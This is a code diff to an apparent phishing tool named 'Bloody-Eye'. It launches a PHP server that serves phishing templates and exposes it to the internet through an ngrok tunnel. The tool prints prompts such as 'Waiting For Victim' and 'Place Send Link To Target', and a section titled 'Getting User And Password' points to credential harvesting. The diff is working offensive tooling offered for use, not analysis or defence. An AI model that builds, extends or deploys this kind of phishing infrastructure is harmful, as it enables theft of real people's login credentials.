@@ -545,16 +545,21 @@ exit();""")
     print("")
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
-       with open("log","w") as deafult:
-          Popen(('php','-S','localhost:6060','-t','../Bloody-Eye/templates/phishing'),stderr=phplog,stdout=phplog)
-       print("hahahaha")
-    # - - - - - - - - - - -- - - - - - - - - - - - - - - -
+      with open("log","w") as phplog:
+        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+      print("")
+      time.sleep(0.07)
+      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
+      print("")
+      time.sleep(0.07)
+      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
       with open("log","w") as phplog:
-         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      global token
-      a = ngrok.connect(6060,"http",auth_token=token)
-      print(a)      
+        Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+    global token
+    a = ngrok.connect(6060,"http",auth_token=token)
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
+    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
 # Getting User And Password
     def userin():
         global stat_file
@@ -614,7 +619,8 @@ exit();""")
   except:
     with open("exit","w") as kill:
       Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-  
+      print("uhahahahahahahahahahahahahhahahaahah")
+      time.sleep(5)
       os.system("clear")
       sys.exit()
 
